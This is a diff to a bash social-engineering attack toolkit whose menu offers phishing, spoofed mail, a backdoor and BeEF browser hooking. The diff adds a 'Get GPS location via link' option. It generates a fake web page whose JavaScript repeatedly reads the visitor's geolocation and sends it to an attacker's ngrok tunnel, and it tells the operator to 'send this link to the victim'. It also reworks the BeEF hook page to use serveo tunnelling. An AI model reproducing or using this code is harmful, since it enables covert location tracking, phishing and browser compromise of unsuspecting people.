@@ -9,6 +9,7 @@ rm msf.rc
 cd ..
 cd output/
 rm output.ps1
+rm final.exe
 cd ..
 cd tools/
 rm msf.rc
@@ -20,7 +21,7 @@ echo "                  ███████╗█████╗     ██║
 echo "                  ╚════██║██╔══╝     ██║   ";
 echo "                  ███████║███████╗   ██║ 2 ";
 echo "                  ╚══════╝╚══════╝   ╚═╝   ";
-echo "                  M3-Sec.        V: 0.03   ";
+echo "                  M3-Sec.        V: 0.04   ";
 echo "     The new Social Engineering toolkit with new tools.";
 echo ""
 echo "1)      QR-Code Attacks"
@@ -28,6 +29,7 @@ echo "2)      Spoofmail"
 echo "3)      Phishing"
 echo "4)      Undetectable Backdoor"
 echo "5)      Exploit Browser"
+echo "6)      Get GPS location via link"
 echo "0)      Exit"
 read menu
 if [[ $menu = 1 ]]; then
@@ -62,7 +64,7 @@ elif [[ $menu = 3 ]]; then
         gnome-terminal -e "./spoofmail" &
         sleep 2
         clear
-        printf "\033[5m(YOU NEED TO ENTER THE NGORK ADRESS INSIDE THE BODY OF THE EMAIL : $ngrokurl !)\033[0m"
+        printf "\033[5m(YOU NEED TO ENTER THE NGROK ADRESS INSIDE THE BODY OF THE EMAIL : $ngrokurl !)\033[0m"
         echo ""
         read -p "Press [ENTER] to go back to menu."
         cd ~/set2/
@@ -110,7 +112,7 @@ elif [[ $menu = 4 ]]; then
         if [[ $menu412 = 1 ]]; then
             echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1
             if [ $? -eq 0 ]; then
-                clear    
+                clear
                 echo "Please enter the PORT you want to :"
                 read LPORT
                 ngrokip=$(resolveip -s 0.tcp.ngrok.io)
@@ -151,7 +153,7 @@ elif [[ $menu = 4 ]]; then
                 echo "2 = no"
                 read msfy1
                 if [[ $msfy1 = 2 ]]; then
-                bash ~/set2/set2.sh
+                    bash ~/set2/set2.sh
                 elif [[ $msfy1 = 1 ]]; then
                     cd temp
                     rm msf.rc
@@ -227,7 +229,7 @@ elif [[ $menu = 4 ]]; then
 elif [[ $menu = 5 ]]; then
     clear
     echo "Do you want to do it over..."
-    echo "1)   ...WAN"
+    echo "1)   ...WAN (Under heavy development! Not working 100%)"
     echo "2)   ...LAN"
     read menu5
     if [[ $menu5 = 1 ]]; then
@@ -236,9 +238,12 @@ elif [[ $menu = 5 ]]; then
             clear
             ngrokip=$(resolveip -s ngrok.com)
             cd tools/
-            xterm -e ./ngrok http 3000 &
+            xterm -e ./ngrok tcp 3000 &
             sleep 2
-            ngrokurl=$(curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh)
+            bash serveo.sh &
+            sleep 2
+            url=$(cat file | grep "https://[0-9a-z]*\.serveo.net" -oh)
+            clear
             cd ..
             cd /usr/share/beef-xss
             xterm ./beef &    
@@ -251,19 +256,19 @@ elif [[ $menu = 5 ]]; then
             echo "<html>" >> index.html
             echo "<title> $title </title>" >> index.html
             echo "<body>" >> index.html
-            echo "<script src='http://$ngrokip:3000/hook.js'></script>" >> index.html
+            echo "<script src='http://127.0.0.1:3000/hook.js'></script>" >> index.html
             echo "$body" >> index.html
             echo "</body>" >> index.html
             echo "</html>" >> index.html
             clear
             service apache2 start
             printf "Now run "
-            printf "\033[1m$ngrokurl\033[0m"
+            printf "\033[1m$url\033[0m"
             printf " on the victim PC.  "
             echo ""
             xterm -geometry 0x0 -e firefox http://127.0.0.1:3000/ui/panel &
             read -p "Press [ENTER] to stop"
-            killall ruby xterm
+            killall ruby xterm ssh
             service apache2 stop
             cd ~/set2/
             ./set2.sh   
@@ -303,11 +308,70 @@ elif [[ $menu = 5 ]]; then
         killall ruby xterm
         service apache2 stop
         cd ~/set2/
-        ./set2.sh
+        bash ~/set2/set2.sh
     else
         bash ~/set2/set2.sh
     fi
 
+elif [[ $menu = 6 ]]; then
+    echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1
+        if [ $? -eq 0 ]; then
+            cd ~/set2/tools
+            clear
+            xterm -e ./ngrok http 80 &
+            echo "Enter the Title for your fake Website:"
+            read title
+            echo "Enter the Body text for your fake Website:"
+            read body
+            sleep 2
+            ngrokurl=$(curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh)
+            echo "<!DOCTYPE html>
+<html>
+    <head>
+        <title>$title</title>
+    </head>
+    <body>
+        $body
+        <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js\" type='text/javascript' ></script>
+        <script type='text/javascript'>
+        function httpGet(theUrl)
+        {
+            var xmlHttp = new XMLHttpRequest();
+            xmlHttp.open( \"GET\", theUrl, false ); // false for synchronous request
+            xmlHttp.send( null );
+            return xmlHttp.responseText;
+        }
+        function autoUpdate() {
+          navigator.geolocation.getCurrentPosition(function(position) {
+            coords = position.coords.latitude + \",\" + position.coords.longitude;
+             url = \""$ngrokurl"/logme/\" + coords;
+            httpGet(url);
+            console.log('should be working');
+            setTimeout(autoUpdate, 2000);
+        })
+        };
+        \$(document).ready(function(){
+           autoUpdate();
+        });
+        </script>
+    </body>
+</html>" > index.html
+            mv index.html /var/www/html
+            service apache2 start
+            echo "GPS DATA" > /var/log/apache2/access.log
+            xterm -e tail -f /var/log/apache2/access.log &
+            printf "Send this link to the victim \033[1m $ngrokurl \033[0m"
+            echo ""
+            read -p "Press [ENTER] to go back to menu."
+            killall xterm 
+            service apache2 stop
+            rm /var/www/html/index.html
+            bash ~/set2/set2.sh
+        else
+            echo "You are offline!"
+            sleep 2
+            bash ~/set2/set2.sh
+        fi
 
 
 elif [[ $menu = 0 ]]; then
@@ -315,5 +379,5 @@ elif [[ $menu = 0 ]]; then
 else
     clear
     echo "?"
-    ./set2.sh
+    bash ~/set2/set2.sh
 fi
